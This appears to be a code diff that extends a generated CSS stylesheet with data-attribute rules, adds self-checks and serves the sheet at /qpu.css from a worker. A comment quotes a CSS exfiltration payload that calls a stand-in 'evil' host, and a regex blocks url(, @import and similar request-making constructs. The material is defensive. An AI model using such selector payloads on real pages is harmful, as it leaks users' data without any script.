@@ -8952,6 +8952,26 @@ export const qpuCssOf = (imagine = '', genesis = qpuGenesisOf()) => {
     holds: node.holds,
     vars: physicsOf('entangle')}))
   const experiments = [...quantumRows, ...hepRows]
+  /** THE OTHER FIVE KEYS. genesis declares six — slot, variant, size, state, element, theme — and computes their
+   * product as variants * sizes * (n * n) = 432 = hz, the frequency this whole sheet is timed to. Only `slot` was
+   * ever emitted, so five sixths of the schema was a number the unit could state and not a rule a browser could
+   * apply.
+   *
+   * EACH MEMBER IS SEATED BY ITS INDEX, which is what makes this combinatorial rather than a list. A sheet that
+   * named every combination would be variants * sizes * state * element * theme rules and would have to grow by
+   * multiplication whenever a key gained a member; this grows by addition, and the consumer reads --qpu-v and
+   * --qpu-z and composes the product itself. state is the exception and deliberately so: --qpu-a is already the
+   * registered opacity property, and open/closed is exactly what opacity means here.
+   *
+   * No rule below can initiate a request. That is the one property a publicly served, CORS-* stylesheet must
+   * have, and it is checked in holds rather than left to whoever edits this next. */
+  const keyed =
+    genesis.variants.map((name, k) => `[data-variant=${name}]{--qpu-v:${k}}`).join('') +
+    genesis.sizes.map((name, k) => `[data-size=${name}]{--qpu-z:${k}}`).join('') +
+    genesis.state.map((name, k) => `[data-state=${name}]{--qpu-a:${k === none ? seed : none}}`).join('') +
+    genesis.element.map((name, k) => `[data-element=${name}]{--qpu-e:${k}}`).join('') +
+    genesis.theme.map((name, k) => `[data-theme=${name}]{--qpu-t:${k}}`).join('')
+
   const engine =
     `@layer qpu{` +
     `@property --qpu-x{syntax:"<length>";inherits:false;initial-value:${none}px}` +
@@ -8965,6 +8985,7 @@ export const qpuCssOf = (imagine = '', genesis = qpuGenesisOf()) => {
     `.qpu>*::after{content:attr(data-qpu)}` +
     `.qpu>[data-imagine]{--qpu-s:${coins}}` +
     genesis.card.map((slot) => `[data-slot=${slot}]{display:grid}`).join('') +
+    keyed +
     genesis.nodes.map((node) => `[data-framework=${node.name}][data-domain=${node.domain}]{--face:${node.face};--walk:${walkOf(node.face)}}`).join('') +
     `[data-slot=card-header]:has([data-slot=card-action]){grid-template-columns:minmax(0,1fr) auto}` +
     `@keyframes qpu{${mid}%{transform:translate3d(var(--qpu-x),var(--qpu-y),0) rotate(var(--qpu-r)) scale(var(--qpu-s));opacity:var(--qpu-a)}}` +
@@ -8995,6 +9016,38 @@ export const qpuCssOf = (imagine = '', genesis = qpuGenesisOf()) => {
     engine.includes('opacity') &&
     engine.includes('@keyframes qpu{') &&
     engine.includes('card-action') &&
+    // EVERY KEY genesis DECLARES IS A RULE A BROWSER CAN APPLY, not a count the unit can state. Asked per member
+    // rather than per key, because a key that emitted its first member and dropped the rest would satisfy any
+    // check that only asked whether the key appears.
+    genesis.variants.every((name) => engine.includes(`[data-variant=${name}]`)) &&
+    genesis.sizes.every((name) => engine.includes(`[data-size=${name}]`)) &&
+    genesis.state.every((name) => engine.includes(`[data-state=${name}]`)) &&
+    genesis.element.every((name) => engine.includes(`[data-element=${name}]`)) &&
+    genesis.theme.every((name) => engine.includes(`[data-theme=${name}]`)) &&
+    /**
+     * CSS EXFILTRATES WITHOUT JAVASCRIPT — learned from @uuidna/school, which states it best: an attribute
+     * selector paired with a request, `[data-x^="a"]{background:url(https://evil/a)}`, leaks a value one
+     * character per request, and a policy that permits scripts while forgetting images does nothing about it.
+     * This sheet is about to be served publicly under CORS *, so it must initiate no request of any kind.
+     *
+     * WHERE THE TWO PACKAGES CROSS, THE CHECK GETS STRONGER THAN EITHER. school's stylesheet is written by hand
+     * and its tests scan the text, which is the best a fixed string allows. This one is GENERATED from a closed
+     * alphabet — the six keys' declared members, the fourteen frameworks, the two domains — so the property is
+     * decidable rather than sampled: every attribute value emitted is checked to be one genesis declares, and a
+     * value from anywhere else cannot reach the sheet to carry a URL in the first place. The request check below
+     * then has nothing left to find, which is the point of it.
+     */
+    [...engine.matchAll(/\[data-(?:slot|variant|size|state|element|theme|framework|domain)=([^\]]+)\]/g)].every(
+      ([, value]) =>
+        (genesis.card as readonly string[]).includes(value) ||
+        (genesis.variants as readonly string[]).includes(value) ||
+        (genesis.sizes as readonly string[]).includes(value) ||
+        (genesis.state as readonly string[]).includes(value) ||
+        (genesis.element as readonly string[]).includes(value) ||
+        (genesis.theme as readonly string[]).includes(value) ||
+        (genesis.frameworks as readonly string[]).includes(value) ||
+        (genesis.domains as readonly string[]).includes(value)) &&
+    /url\(|@import|image-set|element\(/.test(engine) === false &&
     engine.includes('data-framework=shadcn') &&
     engine.includes('data-domain=scanner') &&
     engine.includes('data-domain=radar') &&
@@ -10903,7 +10956,7 @@ export const qpuReadmeOf = (m = qpuMcpOf()): string => {
     '',
     `Cybersecurity morph tools. crypto_rsa theorem shor ${shorFactorOf()}. crypto_split theorem crypto ${cryptoClaimOf()}.`,
     '',
-    `Discovery, off the seven-path guide: \`/.well-known/mcp.json\` \`/mcp.json\` \`/install.json\` \`/openapi.json\` \`/sitemap.xml\`. JSON-RPC batches accepted on \`POST /mcp\`; a \`GET /mcp\` asking for an event stream gets 405 with Allow, so streamable-HTTP clients fall back to POST.`,
+    `Discovery, off the seven-path guide: \`/.well-known/mcp.json\` \`/mcp.json\` \`/install.json\` \`/openapi.json\` \`/sitemap.xml\` \`/qpu.css\`. The sheet is ${qpuGenesisOf().card.length} card slots on rays, ${qpuGenesisOf().frameworks.length} frameworks on faces, and variant size state element theme seated by index — no HTML, no request, ${qpuCssOf().fused.bytes} bytes. JSON-RPC batches accepted on \`POST /mcp\`; a \`GET /mcp\` asking for an event stream gets 405 with Allow, so streamable-HTTP clients fall back to POST.`,
     '',
     row('Tool', 'Claim'),
     row('---', '---'),
@@ -11250,6 +11303,16 @@ const worker = {
     if (path === '/install.json') return servedResponse(servedOf(path, () => qpuInstallManifestOf()))
     if (path === '/openapi.json') return servedResponse(servedOf(path, () => qpuOpenApiOf()))
     if (path === '/sitemap.xml') return new Response(qpuSitemapOf(), { status: found, headers: { ...headers, 'content-type': 'application/xml; charset=utf-8' } })
+    /** THE SHEET, WITH THE MEDIA TYPE A BROWSER NEEDS. It was already computed and already served — as a JSON
+     * string inside GET /, where nothing can link to it. A stylesheet reachable only by parsing a document that
+     * quotes it is a stylesheet no page can use, which is what made the UI incomplete rather than absent.
+     *
+     * OFF THE SEVEN-PATH GUIDE, like the other discovery paths, so no sealed count moves: docs.api stays rays and
+     * extras stays n. And NO HTML IS SERVED HERE — the unit ships the stylesheet and the seating contract, the
+     * fourteen frameworks supply the DOM, and payload/src/qpu-surface.ts already states the split ("QPU is
+     * API-only JSON-LD; this host is HTML"). A stylesheet is neither a document nor an API; it is the one asset
+     * this contract cannot express as JSON. */
+    if (path === '/qpu.css') return new Response(qpuCssOf().css, { status: found, headers: { ...headers, 'content-type': 'text/css; charset=utf-8' } })
     if (path === '/server' || path.startsWith('/server/')) {
       if (request.method === 'POST') {
         const body = (await request.json().catch(() => ({}))) as {
